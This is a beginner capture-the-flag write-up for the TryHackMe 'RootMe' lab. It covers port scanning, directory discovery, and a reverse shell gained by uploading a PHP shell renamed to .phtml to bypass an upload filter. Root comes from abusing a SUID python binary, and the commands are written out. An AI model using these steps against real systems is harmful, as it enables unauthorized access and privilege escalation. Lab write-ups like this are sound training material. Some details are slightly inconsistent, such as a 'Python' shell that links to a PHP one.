# **Try Hack Me: RootMe Attack Box**

A ctf for beginners, can you root me?

Date: 22/11/2021:2135
Completed by: XeaoZ

## Task 1

1. **Deploy the machine**
	- Deployed the machine with the IP 10.10.117.45.

## Task 2

1. **Scan the machine, how many ports are open**
	- Scanned the machine using `nmap -sV IP`
3. **What version of Apache is running**
	-	Result of the previous search `Apache httpd 2.4.29`
5. **What service is running on port 22**
	-	Port 22 is running SSH.
7. **Find directories on the web server using GoBuster tool.**
	-	Decided to use `dirb http://IP`
9. **What is the hidden directory**
	-	Hidden directory was /panel/

## Task 3

1. **Find a form to upload and get a reverse shell, and find the flag.**
	-	Used Python reverse shell ([http://pentestmonkey.net/tools/php-reverse-shell](url))
	-	Opened a lisner port `nc -lvnp 4444`
	-	Changed extension of the file to .phtml to avoid the upload not accepting .php files.
	-	This gave me reverse shell. 
	-	Used following code after gaining shell: `python -c 'import pty; pty.spawn("/bin/bash")' OR /usr/bin/script -qc /bin/bash /dev/null`

## Task 4

1. **Search for files with SUID permission, which file is weird?**
	-	Used the following command to search for all SUID permissions: `find / -perm /4000  2>/dev/null`
	-	WWW/bin/python	
2. **Find a form to escalate your privileges.**
	-	[https://gtfobins.github.io/](url)
	-	If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. 
	-	`python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
	-	Root gained.
3. **root.txt flag**
	-	`cat root/root.txt`
	- Hidden Flag
